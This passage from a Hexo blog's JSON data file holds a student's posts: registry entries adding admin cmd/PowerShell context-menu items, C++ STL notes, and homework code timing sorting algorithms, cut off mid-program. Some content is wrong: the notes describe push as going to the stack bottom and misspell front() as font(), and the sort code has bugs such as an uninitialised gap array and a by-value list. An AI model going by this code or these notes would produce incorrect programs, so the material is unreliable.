class=\"line\">@&#x3D;&quot;@shell32.dll,-8506&quot;</span><br><span class=\"line\">&quot;NoWorkingDirectory&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\">&quot;ShowBasedOnVelocityId&quot;&#x3D;dword:00639bc8</span><br><span class=\"line\">&quot;HasLUAShield&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]</span><br><span class=\"line\">@&#x3D;&quot;cmd.exe &#x2F;s &#x2F;k pushd \\&quot;%V\\&quot;&quot;</span><br></pre></td></tr></table></figure>","more":"<h2 id=\"powershell\"><a href=\"#powershell\" class=\"headerlink\" title=\"powershell\"></a>powershell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]</span><br><span class=\"line\">@&#x3D;&quot;@shell32.dll,-8508&quot;</span><br><span class=\"line\">&quot;NoWorkingDirectory&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\">&quot;ShowBasedOnVelocityId&quot;&#x3D;dword:00639bc8</span><br><span class=\"line\">&quot;HasLUAShield&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]</span><br><span class=\"line\">@&#x3D;&quot;\\&quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\&quot; -windowstyle hidden -Command $stpath &#x3D; pwd; Start-Process PowerShell -ArgumentList \\\\\\&quot;-NoExit\\\\\\&quot;, \\\\\\&quot;-Command Set-Location -literalPath &#39;%V&#39;\\\\\\&quot; -verb RunAs&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"相关解释\"><a href=\"#相关解释\" class=\"headerlink\" title=\"相关解释\"></a>相关解释</h1><h2 id=\"项-K\"><a href=\"#项-K\" class=\"headerlink\" title=\"项(K)\"></a>项(K)</h2><p><code>runas</code> 管理员运行<br><code>command</code> 运行时执行的命令</p>\n<h2 id=\"字符串值-S-（REG-SZ）\"><a href=\"#字符串值-S-（REG-SZ）\" class=\"headerlink\" title=\"字符串值(S) （REG_SZ）\"></a>字符串值(S) （REG_SZ）</h2><p><code>(默认)</code> 显示的名称<br><code>Extended</code> 是否 shift 扩展<br><code>HasLUAShield</code> 是否显示用户账户控制图标<br><code>NoWorkingDirectory</code> 暂时未知</p>\n<h2 id=\"DWORD-32位-值-（D）\"><a href=\"#DWORD-32位-值-（D）\" class=\"headerlink\" title=\"DWORD(32位)值 （D）\"></a>DWORD(32位)值 （D）</h2><p><code>ShowBasedOnVelocityId</code> 暂时未知</p>"},{"title":"C++ STL","date":"2019-04-01T14:22:14.000Z","abbrlink":"5c80f146","_content":"# stack\n栈是 **后进先出** (Last In Fisrt Out)的一种特殊的线性表。\n栈的基本操作如下。\n```\nstack<int>S;     //定义栈\nS.push(x);       //入栈\nS.pop();         //出栈\nS.top();         //取栈顶元素\nS.empty();       //判断栈是否为空\nS.size();        //获取栈的大小\n```\n<!--more-->\n栈可以存储多种类型数据,包括但不限于`int` `char` `string` `double`以及`pair`等等.\n入栈是把元素压入栈底;\n出栈是删除栈顶元素;\n取栈顶元素只返回元素,不删除;\n获取栈的大小返回栈內元素数量;\n栈的判空一般都和 while 循环配套使用,比如下面代码输出栈内所有元素,并清空栈.\n```\nwhile(!S.empty())\n{\n    cout<<S.top()<<endl;\n    S.pop();\n}\n```\n# queue\n```\nqueue<int>Q;\t//定义队列\nQ.push();\t\t//入队\nQ.font();\t\t//返回队头元素\nQ.back();\t\t//返回队尾元素\nQ.pop();\t\t//出队\nQ.empty();\t\t//队列判空\n```\n队列是 **先入先出** (Fisrt In Fisrt Out)的一种特殊的线性表.\n队列队头删除,队尾插值;\n和栈一样,队列在取元素,删除元素前应确保队列不为空;\n\n# map\n```\nmap<key,value>M;\t//定义map\nM[key]=value;\t\t//map赋值\n```\nmap为key(键)到value(键值)的映射,底部实现为红黑树.\nmap中的key值不允许重复,且不能改变,按照给定的排序规则对key进行排序.\n\n# set\n```\nset<int>S;\t\t//定义set\nS.insert();\t\t//set插值\n```\nset是一个有序集合,使用平衡二叉树存储,按照给定的排序规则(默认为less)对set中的数据进行排序.\n和map一样,set不允许有重复元素.\n\n# pair\n```\npair<int,int>P;\t\t//定义pair\nmake_pair(a,b);\t\t//以a,b的值创建一个新的pair对象\n\n```\n","source":"_posts/STL.md","raw":"---\ntitle: C++ STL\ndate: 2019-04-01 22:22:14\ncategories:\n  - 编程语言\n  - C++\ntags:\n  - C++\nabbrlink: 5c80f146\n---\n# stack\n栈是 **后进先出** (Last In Fisrt Out)的一种特殊的线性表。\n栈的基本操作如下。\n```\nstack<int>S;     //定义栈\nS.push(x);       //入栈\nS.pop();         //出栈\nS.top();         //取栈顶元素\nS.empty();       //判断栈是否为空\nS.size();        //获取栈的大小\n```\n<!--more-->\n栈可以存储多种类型数据,包括但不限于`int` `char` `string` `double`以及`pair`等等.\n入栈是把元素压入栈底;\n出栈是删除栈顶元素;\n取栈顶元素只返回元素,不删除;\n获取栈的大小返回栈內元素数量;\n栈的判空一般都和 while 循环配套使用,比如下面代码输出栈内所有元素,并清空栈.\n```\nwhile(!S.empty())\n{\n    cout<<S.top()<<endl;\n    S.pop();\n}\n```\n# queue\n```\nqueue<int>Q;\t//定义队列\nQ.push();\t\t//入队\nQ.font();\t\t//返回队头元素\nQ.back();\t\t//返回队尾元素\nQ.pop();\t\t//出队\nQ.empty();\t\t//队列判空\n```\n队列是 **先入先出** (Fisrt In Fisrt Out)的一种特殊的线性表.\n队列队头删除,队尾插值;\n和栈一样,队列在取元素,删除元素前应确保队列不为空;\n\n# map\n```\nmap<key,value>M;\t//定义map\nM[key]=value;\t\t//map赋值\n```\nmap为key(键)到value(键值)的映射,底部实现为红黑树.\nmap中的key值不允许重复,且不能改变,按照给定的排序规则对key进行排序.\n\n# set\n```\nset<int>S;\t\t//定义set\nS.insert();\t\t//set插值\n```\nset是一个有序集合,使用平衡二叉树存储,按照给定的排序规则(默认为less)对set中的数据进行排序.\n和map一样,set不允许有重复元素.\n\n# pair\n```\npair<int,int>P;\t\t//定义pair\nmake_pair(a,b);\t\t//以a,b的值创建一个新的pair对象\n\n```\n","slug":"STL","published":1,"updated":"2020-05-11T09:41:29.490Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbq002bqse58jntc68d","content":"<h1 id=\"stack\"><a href=\"#stack\" class=\"headerlink\" title=\"stack\"></a>stack</h1><p>栈是 <strong>后进先出</strong> (Last In Fisrt Out)的一种特殊的线性表。<br>栈的基本操作如下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">stack&lt;int&gt;S;     &#x2F;&#x2F;定义栈</span><br><span class=\"line\">S.push(x);       &#x2F;&#x2F;入栈</span><br><span class=\"line\">S.pop();         &#x2F;&#x2F;出栈</span><br><span class=\"line\">S.top();         &#x2F;&#x2F;取栈顶元素</span><br><span class=\"line\">S.empty();       &#x2F;&#x2F;判断栈是否为空</span><br><span class=\"line\">S.size();        &#x2F;&#x2F;获取栈的大小</span><br></pre></td></tr></table></figure><br><a id=\"more\"></a><br>栈可以存储多种类型数据,包括但不限于<code>int</code> <code>char</code> <code>string</code> <code>double</code>以及<code>pair</code>等等.<br>入栈是把元素压入栈底;<br>出栈是删除栈顶元素;<br>取栈顶元素只返回元素,不删除;<br>获取栈的大小返回栈內元素数量;<br>栈的判空一般都和 while 循环配套使用,比如下面代码输出栈内所有元素,并清空栈.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(!S.empty())</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout&lt;&lt;S.top()&lt;&lt;endl;</span><br><span class=\"line\">    S.pop();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"queue\"><a href=\"#queue\" class=\"headerlink\" title=\"queue\"></a>queue</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">queue&lt;int&gt;Q;\t&#x2F;&#x2F;定义队列</span><br><span class=\"line\">Q.push();\t\t&#x2F;&#x2F;入队</span><br><span class=\"line\">Q.font();\t\t&#x2F;&#x2F;返回队头元素</span><br><span class=\"line\">Q.back();\t\t&#x2F;&#x2F;返回队尾元素</span><br><span class=\"line\">Q.pop();\t\t&#x2F;&#x2F;出队</span><br><span class=\"line\">Q.empty();\t\t&#x2F;&#x2F;队列判空</span><br></pre></td></tr></table></figure>\n<p>队列是 <strong>先入先出</strong> (Fisrt In Fisrt Out)的一种特殊的线性表.<br>队列队头删除,队尾插值;<br>和栈一样,队列在取元素,删除元素前应确保队列不为空;</p>\n<h1 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map\"></a>map</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">map&lt;key,value&gt;M;\t&#x2F;&#x2F;定义map</span><br><span class=\"line\">M[key]&#x3D;value;\t\t&#x2F;&#x2F;map赋值</span><br></pre></td></tr></table></figure>\n<p>map为key(键)到value(键值)的映射,底部实现为红黑树.<br>map中的key值不允许重复,且不能改变,按照给定的排序规则对key进行排序.</p>\n<h1 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set&lt;int&gt;S;\t\t&#x2F;&#x2F;定义set</span><br><span class=\"line\">S.insert();\t\t&#x2F;&#x2F;set插值</span><br></pre></td></tr></table></figure>\n<p>set是一个有序集合,使用平衡二叉树存储,按照给定的排序规则(默认为less)对set中的数据进行排序.<br>和map一样,set不允许有重复元素.</p>\n<h1 id=\"pair\"><a href=\"#pair\" class=\"headerlink\" title=\"pair\"></a>pair</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pair&lt;int,int&gt;P;\t\t&#x2F;&#x2F;定义pair</span><br><span class=\"line\">make_pair(a,b);\t\t&#x2F;&#x2F;以a,b的值创建一个新的pair对象</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1044,"excerpt":"<h1 id=\"stack\"><a href=\"#stack\" class=\"headerlink\" title=\"stack\"></a>stack</h1><p>栈是 <strong>后进先出</strong> (Last In Fisrt Out)的一种特殊的线性表。<br>栈的基本操作如下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">stack&lt;int&gt;S;     &#x2F;&#x2F;定义栈</span><br><span class=\"line\">S.push(x);       &#x2F;&#x2F;入栈</span><br><span class=\"line\">S.pop();         &#x2F;&#x2F;出栈</span><br><span class=\"line\">S.top();         &#x2F;&#x2F;取栈顶元素</span><br><span class=\"line\">S.empty();       &#x2F;&#x2F;判断栈是否为空</span><br><span class=\"line\">S.size();        &#x2F;&#x2F;获取栈的大小</span><br></pre></td></tr></table></figure><br>","more":"<br>栈可以存储多种类型数据,包括但不限于<code>int</code> <code>char</code> <code>string</code> <code>double</code>以及<code>pair</code>等等.<br>入栈是把元素压入栈底;<br>出栈是删除栈顶元素;<br>取栈顶元素只返回元素,不删除;<br>获取栈的大小返回栈內元素数量;<br>栈的判空一般都和 while 循环配套使用,比如下面代码输出栈内所有元素,并清空栈.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(!S.empty())</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    cout&lt;&lt;S.top()&lt;&lt;endl;</span><br><span class=\"line\">    S.pop();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"queue\"><a href=\"#queue\" class=\"headerlink\" title=\"queue\"></a>queue</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">queue&lt;int&gt;Q;\t&#x2F;&#x2F;定义队列</span><br><span class=\"line\">Q.push();\t\t&#x2F;&#x2F;入队</span><br><span class=\"line\">Q.font();\t\t&#x2F;&#x2F;返回队头元素</span><br><span class=\"line\">Q.back();\t\t&#x2F;&#x2F;返回队尾元素</span><br><span class=\"line\">Q.pop();\t\t&#x2F;&#x2F;出队</span><br><span class=\"line\">Q.empty();\t\t&#x2F;&#x2F;队列判空</span><br></pre></td></tr></table></figure>\n<p>队列是 <strong>先入先出</strong> (Fisrt In Fisrt Out)的一种特殊的线性表.<br>队列队头删除,队尾插值;<br>和栈一样,队列在取元素,删除元素前应确保队列不为空;</p>\n<h1 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map\"></a>map</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">map&lt;key,value&gt;M;\t&#x2F;&#x2F;定义map</span><br><span class=\"line\">M[key]&#x3D;value;\t\t&#x2F;&#x2F;map赋值</span><br></pre></td></tr></table></figure>\n<p>map为key(键)到value(键值)的映射,底部实现为红黑树.<br>map中的key值不允许重复,且不能改变,按照给定的排序规则对key进行排序.</p>\n<h1 id=\"set\"><a href=\"#set\" class=\"headerlink\" title=\"set\"></a>set</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set&lt;int&gt;S;\t\t&#x2F;&#x2F;定义set</span><br><span class=\"line\">S.insert();\t\t&#x2F;&#x2F;set插值</span><br></pre></td></tr></table></figure>\n<p>set是一个有序集合,使用平衡二叉树存储,按照给定的排序规则(默认为less)对set中的数据进行排序.<br>和map一样,set不允许有重复元素.</p>\n<h1 id=\"pair\"><a href=\"#pair\" class=\"headerlink\" title=\"pair\"></a>pair</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pair&lt;int,int&gt;P;\t\t&#x2F;&#x2F;定义pair</span><br><span class=\"line\">make_pair(a,b);\t\t&#x2F;&#x2F;以a,b的值创建一个新的pair对象</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"各种排序时间复杂度比较","date":"2019-03-29T09:11:09.000Z","abbrlink":"52089862","updated":"2020-04-08T10:40:24.000Z","_content":"# 各种排序时间复杂度比较\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<iostream>\n#include<time.h>\n#include<windows.h>\n#include<cstdlib>\nconst int Decimal=1000;\nusing namespace std;\ntypedef struct\n{\n\tint *elem;\n\tint length;\n}SqList;\nvoid InsertSort(SqList L)\n{\n\tint i,j;\n\tfor(i=2;i<L.length;i++)\n\t{\n\t\tif(L.elem[i]<L.elem[i-1])\n\t\t{\n\t\t\tL.elem[0]=L.elem[i];\n\t\t\tL.elem[i]=L.elem[i-1];\n\t\t}\n\t\tfor(j=i-2;L.elem[0]<L.elem[j];j--)\n\t\t\tL.elem[j+1]=L.elem[j];\n\t\tL.elem[j+1]=L.elem[0];\n\t}\n}\nvoid BInsertSort(SqList L)\n{\n\tint i,j,high,low,m;\n\tfor(i=2;i<L.length;i++)\n\t{\n\t\tL.elem[0]=L.elem[i];\n\t\tlow=1;high=i-1;\n\t\twhile(low<=high)\n\t\t{\n\t\t\tm=(low+high)/2;\n\t\t\tif(L.elem[0]<L.elem[m])high=m-1;\n\t\t\telse low=m+1;\n\t\t}\n\t\tfor(j=i-1;j>=high+1;j--)\n\t\t\tL.elem[j+1]=L.elem[j];\n\t\tL.elem[high+1]=L.elem[0];\n\t}\n}\nvoid ShellInsert(SqList &L,int dk)\n{\n\tint i,j;\n\tfor(i=dk+1;i<L.length;i++)\n\t{\n\t\tif(L.elem[i]<L.elem[i-dk])\n\t\t{\n\t\t\tL.elem[0]=L.elem[i];\n\t\t\tfor(j=i-dk;j>0&&L.elem[0]<L.elem[j];j-=dk)\n\t\t\t\tL.elem[j+dk]=L.elem[j];\n\t\t\tL.elem[j+dk]=L.elem[0];\n\t\t}\n\t}\n}\nvoid ShellSort(SqList &L,int dt[],int t)\n{\n\tint k;\n\tfor(k=0;k<t;k++)\n\tShellInsert(L,dt[k]);\n}\nvoid BubbleSort(SqList &L)\n{\n\tint m=L.length-1,flag=1,t;\n\twhile((m>0)&&(flag==1))\n\t{\n\t\tflag=0;\n\t\tfor(int j=1;j<=m;j++)\n\t\t{\n\t\t\tif(L.elem[j]>L.elem[j+1])\n\t\t\t{\n\t\t\t\tflag=1;\n\t\t\t\tt=L.elem[j];\n\t\t\t\tL.elem[j]=L.elem[j+1];\n\t\t\t\tL.elem[j+1]=t;\n\t\t\t}\n\t\t}\n\t\t--m;\n\t}\n}\nint Partition(SqList &L,int low,int high)\n{\n\tL.elem[0]=L.elem[low];\n\tint privotkey=L.elem[low];\n\twhile(low<high)\n\t{\n\t\twhile(low<high&&L.elem[high]>=privotkey)--high;\n\t\t\tL.elem[low]=L.elem[high];\n\t\twhile(low<high&&L.elem[low]<=privotkey)++low;\n\t\t\tL.elem[high]=L.elem[low];\n\t}\n\tL.elem[low]=L.elem[0];\n\treturn low;\n}\nvoid QSort(SqList &L,int low,int high)\n{\n\tint  pivotloc;\n\tif(low<high)\n\t{\n\t\tpivotloc=Partition(L,low,high);\n\t\tQSort(L,low,pivotloc-1);\n\t\tQSort(L,pivotloc+1,high);\n\t}\n}\nvoid QuickSort(SqList &L)\n{\n\tQSort(L,1,L.length);\n}\nvoid Test(SqList &L)\n{\n\tfor(int i=1;i<L.length;i++)\n\tcout<<L.elem[i]<<\" \";\n\tcout<<endl;\n}\nint main()\n{\n\tint k=1,MAXN=1;\n\tSqList L;\n\tdouble run_time,dpFreq;\n\t_LARGE_INTEGER time_start; //开始时间\n\t_LARGE_INTEGER time_over; //结束时间\n\tLARGE_INTEGER f;\n\tQueryPerformanceFrequency(&f);\n\tdpFreq=(double)f.QuadPart; //计时器频率\n\twhile(true)\n\t{\n\t\tMAXN*=10;\n\t\tL.elem=new int[MAXN+1];\n\t\tL.length=MAXN;\n\t\tcout<<\"第\"<<k++<<\"次测试, 数量级:\"<<MAXN<<endl<<endl;\n\t\tsrand((unsigned)time(NULL));\n\t\tfor(int i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);  //计时开始\n\t\tInsertSort(L);\n\t\tQueryPerformanceCounter(&time_over);  //计时结束\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"插入排序:\"<<run_time<<\"ms\"<<endl;\n\t\tfor(int i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);\n\t\tInsertSort(L);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"二分排序:\"<<run_time<<\"ms\"<<endl;\n\t\tint dt[100001],t=100;\n\t\tQueryPerformanceCounter(&time_start);\n\t\tShellSort(L,dt,t);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"希尔排序:\"<<run_time<<\"ms\"<<endl;\n\t\tfor(int i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);\n\t\tBubbleSort(L);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"冒泡排序:\"<<run_time<<\"ms\"<<endl;\n\t\tfor(int 